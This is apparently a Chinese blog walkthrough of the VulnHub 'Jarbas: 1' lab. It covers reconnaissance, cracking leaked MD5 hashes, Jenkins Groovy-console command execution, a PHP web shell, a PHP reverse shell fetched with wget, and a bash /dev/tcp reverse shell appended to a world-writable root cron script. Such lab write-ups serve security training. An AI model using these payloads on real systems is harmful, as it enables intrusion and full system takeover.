---
title: jarbas-1
author: Creexile
date: 2025-04-10 20:35:49
lastMod: 2025-04-10
summary: 'easyNo.15'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [漏洞利用, 渗透]
---

# title

---

> 来源: [vulnhub靶场-jarbas: 1](https://www.vulnhub.com/entry/jarbas-1,232/)
>
> 目标: Get root shell!
>
> 妙妙工具: `python -c 'import pty; pty.spawn("/bin/bash")'`

## 环境配置

- kali: 192.168.146.6
- target: 192.168.146.5

## 信息收集

```bash
# 获取靶机地址 192.168.146.5
sudo nmap -sn 192.168.146.0/24
# 获取端口信息 22,80,3306,8080
sudo nmap -sT --min-rate 10000 -p- 192.168.146.5 -oA scan/ports
# 获取详细信息
sudo nmap -sT -sV -sC -O -p22,80,3306,8080 192.168.146.5 -oA scan/detail
# 看看漏洞
sudo nmap --script=vuln -p22,80,3306,8080 192.168.146.5 -oA scan/vuln
```

扫漏洞的时候发现8080端口有一个robots.txt, 访问有提示, 看不懂是什么

```
# we don't want robots to click "build" links
```

扫一下目录

```bash
dirb http://192.168.146.5

# ---- Scanning URL: http://192.168.146.5/ ----
# + http://192.168.146.5/access.html (CODE:200|SIZE:359)
# + http://192.168.146.5/index.html (CODE:200|SIZE:32808)
# 扫不到可以加上 -X .html 参数
```

访问80端口, 发现是Jenkins cms, 这个cms经过搜索有默认密码, 且存在后台漏洞, 所以看看能不能先登录进去. 尝试部分弱密码, 没法登录, 先看看其他部分

访问之前扫描到的`access.html`, 发现疑似是用户名和密码的md5

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250625110751.png)

```
tiago:5978a63b4654c73c60fa24f836386d87
trindade:f463f63616cb3f1e81ce46b39f882fd5
eder:9b38e2b1e8b12f426b0d208a7ab6cb98
```

不确定可以用`hash-identifier`工具确认一下加密方式, 解密结果如下, [解密网址](https://www.json.cm/md5decrypt/)

```
tiago:italia99
trindade:marianna
eder:vipsu
```

拿到的账号密码用于在8080登录, 测试发现仅有`eder:vipsu`可以登陆

> 试过ssh了, 不行

## getshell

[参考文章](https://blog.csdn.net/weixin_40412037/article/details/120369441), 根据文章内容可以非常轻易复现

```
println "whoami".execute().text
println "ifconfig".execute().text
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250625112544.png)

结合前面的信息收集中, nmap认为这是一个linux系统, 我们尝试写马

```
new File("/var/www/html/shell.php").write('<?php @eval($_POST[cmd]);?>');
```

被告知用户没有权限在这个目录下进行编辑, 看一下权限, 果然是root

```
println "ls -ld /var/www/html".execute().text
```

换一种方法吧, 反正可以执行命令, 上传一个反弹shell然后执行; 自行创建文件并配置简单服务器, 顺手监听1234

```php
<?php
$sock=fsockopen("192.168.146.6",1234);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
```

然后通过网站下载该文件, 并执行命令

```
println "wget http://192.168.146.6:8000/shell.php -P /tmp/".execute().text
println "php /tmp/shell.php".execute().text
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250625121242.png)

成功拿到shell

## 信息收集

```bash
# 系统信息 Linux jarbas 3.10.0-693.21.1.el7.x86_64 #1 SMP Wed Mar 7 19:03:37 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
uname -a
# 内核版本 3.10.0-693.21.1.el7.x86_64
uname -r
# 查看发行版的信息 CentOS Linux release 7.4.1708 (Core)
cat /etc/*release
# 查看环境
python -h
# 查看权限, 无
sudo -l
# 查看特权文件, 无发现
find / -perm -u=s -type f 2>/dev/null
# 看看计划任务, 发现一个用root权限启动的脚本
cat /etc/crontab
```

存在python, 利用python起一个新的交互式shell, 我说妙妙工具真好用

来看看这个计划任务, 每五分钟执行一次

```
*/5 * * * * root /etc/script/CleaningScript.sh >/dev/null 2>&1
```

先来看看权限, 是777, 任何人可以编辑这个sh文件, 那么我认为这就是提权的方式了

```bash
ls -ld /etc/script/CleaningScript.sh
# -rwxrwxrwx. 1 root root 50 Apr  1  2018 /etc/script/CleaningScript.sh
```

看看内容, 是一个自动删除`/var/log/httpd/access_log.txt`的脚本

## 提权

在这个脚本后追加内容, 让它反弹shell

```bash
echo "/bin/bash -i >& /dev/tcp/192.168.146.6/5555 0>&1" >> /etc/script/CleaningScript.sh
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250625123050.png)

拿到root权限, `/root`目录下有flag, 可以拿拿
